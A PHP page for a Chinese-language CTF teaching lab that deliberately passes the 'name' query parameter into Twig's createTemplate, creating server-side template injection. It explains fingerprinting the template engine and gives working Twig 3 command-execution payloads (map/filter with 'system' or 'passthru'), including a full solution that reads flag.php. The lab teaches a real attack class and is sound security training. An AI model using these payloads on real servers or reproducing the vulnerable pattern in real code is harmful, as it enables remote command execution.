<?php
// ============================================================
// ssti3 · Twig 模板注入（SSTI 第三课 · 换引擎）
// 漏洞点：用户输入被拼进 Twig 模板源码 createTemplate() 渲染
// 考点：  ① {{7*7}} 探测；② {{7*'7'}} 引擎指纹（Twig=49 / Jinja2=7777777）
//         ③ Twig 3 的 map/filter 过滤器可传回调函数名 → 命令执行
// 依赖：  lib/Twig（twigphp/Twig v3.21.1 源码 vendor，见 twig_bootstrap.php）
// ============================================================
require __DIR__ . '/twig_bootstrap.php';

$output = null;
$tpl = isset($_GET['name']) ? $_GET['name'] : '';
if ($tpl !== '') {
    try {
        $env = new \Twig\Environment(
            new \Twig\Loader\ArrayLoader(['mail' => '占位']),
            ['cache' => false, 'strict_variables' => false]
        );
        // ---------------------- 漏洞点 ----------------------
        $output = $env->createTemplate('亲爱的【' . $tpl . '】会员：您的订单已发货，感谢惠顾！')
                      ->render([]);
    } catch (Throwable $e) {
        $output = '模板渲染出错：' . $e->getMessage();
    }
}
function e($s) { return htmlspecialchars((string)$s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ssti3 · Twig 模板注入 | CTF 教学靶场</title>
<style>
:root{--bg:#0f172a;--card:#1e293b;--ink:#e2e8f0;--dim:#94a3b8;--acc:#38bdf8;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171}
*{box-sizing:border-box}body{margin:0;font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75}
.wrap{max-width:920px;margin:0 auto;padding:24px 16px 60px}
.badge{display:inline-block;background:#0ea5e9;color:#04121f;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;letter-spacing:1px}
h1{font-size:26px;margin:10px 0 4px}.meta{color:var(--dim);font-size:13px;margin-bottom:6px}
.card{background:var(--card);border:1px solid #334155;border-radius:12px;padding:18px 20px;margin:16px 0}
.card h2{margin:0 0 10px;font-size:17px;color:var(--acc);border-left:3px solid var(--acc);padding-left:8px}
pre,code{font-family:Consolas,Menlo,"Courier New",monospace}
pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
input[type=text]{width:65%;min-width:220px;padding:8px 10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink)}
button{padding:8px 18px;border-radius:8px;border:0;background:var(--acc);color:#04121f;font-weight:700;cursor:pointer}
button:hover{filter:brightness(1.15)}
.result{background:#0b1220;border:1px solid #27364d;border-radius:8px;margin-top:12px}
.result .t{padding:6px 12px;border-bottom:1px solid #27364d;color:var(--dim);font-size:12px}
.result pre{border:0;margin:0}
details{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:10px 14px;margin:8px 0}
summary{cursor:pointer;color:var(--warn);font-weight:600}
table{border-collapse:collapse;width:100%;font-size:14px}td,th{border:1px solid #334155;padding:6px 10px;text-align:left}th{color:var(--acc)}
.nav{display:flex;justify-content:space-between;margin-top:22px}.nav a{color:var(--acc);text-decoration:none}
footer{color:var(--dim);font-size:12px;text-align:center;margin-top:30px}
.flagrow{display:flex;gap:8px;flex-wrap:wrap}#flagResult{margin-top:8px;font-size:14px;color:var(--warn);word-break:break-all}
</style>
</head>
<body>
<div class="wrap">
<header>
<span class="badge">SSTI · 模板注入 · 第 3 关</span>
<h1>发货通知生成器 —— Twig 模板注入</h1>
<div class="meta">难度：★★☆☆☆ 进阶 · 关卡 ID：<code>ssti3</code> · 运行时：PHP 8 + Twig 3.21</div>
</header>

<section class="card">
<h2>题目描述</h2>
<p>商城的后端换成了 PHP，发货通知用 <b>Twig</b> 模板引擎渲染（Symfony 生态标配）。会员昵称依旧被直接拼进模板源码。</p>
<p>目标：读取本目录下 <code>flag.php</code> 的<b>源码</b>（flag 在 PHP 注释里，直接访问该文件是空白）。</p>
</section>

<section class="card">
<h2>实验区</h2>
<form method="get" action="">
<label>会员昵称：<input type="text" name="name" placeholder="先试试 {{7*7}}，再试试 {{7*'7'}}" value="<?= e($tpl) ?>"></label>
<button type="submit">预览通知</button>
</form>
<?php if ($output !== null): ?>
<div class="result"><div class="t">渲染结果（PHP 的 Warning 也属于输出，不用管）</div>
<pre><?= e($output) ?></pre></div>
<?php endif; ?>
</section>

<section class="card">
<h2>知识点讲解</h2>
<p><b>Twig</b> 是 PHP 世界最流行的模板引擎之一（Symfony/Laravel 生态常用），语法同样是 <code>{{ 表达式 }}</code>。本关核心代码：</p>
<pre>&lt;?php
$env = new \Twig\Environment(new \Twig\Loader\ArrayLoader([...]), ['cache' =&gt; false]);
$output = $env-&gt;createTemplate('亲爱的【' . $name . '】会员：...')   // ← 漏洞：输入拼进模板源码
              -&gt;render([]);</pre>
<p><b>第一步先认引擎</b>——同一条探测载荷在不同引擎里结果不同：</p>
<table>
<tr><th>载荷</th><th>Jinja2（Python）</th><th>Twig（PHP）</th></tr>
<tr><td><code>{{7*7}}</code></td><td>49</td><td>49</td></tr>
<tr><td><code>{{7*'7'}}</code></td><td><code>7777777</code>（字符串重复）</td><td><code>49</code>（PHP 弱类型转数字）</td></tr>
</table>
<p><b>Twig 3 的命令执行面</b>：表达式本身没有 <code>__globals__</code> 这种东西，但有些<b>过滤器接受「回调」参数</b>（本版本均实测可用）：</p>
<table>
<tr><th>载荷</th><th>原理</th></tr>
<tr><td><code>{{['命令']|map('system')}}</code></td><td>map 把数组每个元素交给回调：<code>array_map('system', ['命令'])</code></td></tr>
<tr><td><code>{{['命令']|filter('system')}}</code></td><td>filter 同理（PHP 8 下会带一条 by-reference Warning，不影响执行）</td></tr>
<tr><td><code>{{['命令']|map('passthru')}}</code> 等</td><td>回调名可换成任何可用的 PHP 函数</td></tr>
</table>
<p>老题解里的 <code>{{_self.env.registerUndefinedFilterCallback(...)}}</code> 是 Twig 1.x/2.x 早期的打法，Twig 3 已删掉 <code>_self.env</code>（实测报「未定义宏」），别再背老 payload。</p>
</section>

<section class="card">
<h2>渐进提示（点开一条想一条，别一口气全看）</h2>
<details><summary>提示 1：先确认这是哪种引擎</summary><p>输入 <code>{{7*7}}</code> 得 49 确认 SSTI；再输入 <code>{{7*'7'}}</code>，若结果还是 <code>49</code>，说明是 PHP 系（Twig/Smarty），而不是 Jinja2（会是 7777777）。页面标题和报错也直说了引擎是 Twig。</p></details>
<details><summary>提示 2：Twig 里怎么执行「函数」</summary><p>Twig 表达式不能直接写 PHP 语句，但 <code>map</code>/<code>filter</code> 这类过滤器接受<b>回调函数名</b>当参数：<code>['参数']|map('函数名')</code> 会把数组元素逐个传给该函数。想想哪个 PHP 内置函数能执行 shell 命令。</p></details>
<details><summary>提示 3：完整 payload</summary><p><code>?name={{['cat flag.php']|map('system')}}</code> —— 通知正文里会混进 flag.php 的源码，找到 flag。Windows 本地复现用 <code>['type flag.php']</code>。</p></details>
</section>

<section class="card">
<h2>提交 Flag</h2>
<form id="flagForm" class="flagrow" onsubmit="return false">
<input type="text" id="flagInput" placeholder="flag{...}" style="flex:1">
<button onclick="submitFlag()">提交</button>
</form>
<div id="flagResult"></div>
</section>

<nav class="nav"><a href="/ssti2">← 上一关：ssti2 · 过滤绕过</a><a href="/ssti4">下一关：ssti4 · Smarty →</a></nav>
<footer>CTF Web 教学式靶场 · C 组 · 仅用于安全学习</footer>
</div>
<script>
function submitFlag(){
  var v=document.getElementById('flagInput').value.trim();
  var el=document.getElementById('flagResult');
  if(!v){el.textContent='请输入 flag';return}
  el.textContent='提交中...';
  fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'challenge_id=ssti3&flag='+encodeURIComponent(v)})
   .then(function(r){return r.text().then(function(t){
      var msg='HTTP '+r.status+': '+t;
      try{var j=JSON.parse(t);
        if(typeof j.correct==='boolean')msg=j.correct?'✅ 回答正确！':'❌ flag 不对，再试试';
        else if(j.message!==undefined)msg=j.message;
      }catch(e){}
      el.textContent=msg;})})
   .catch(function(e){el.textContent='提交失败('+e.message+')：请从靶场门户页提交'});
}
</script>
</body>
</html>
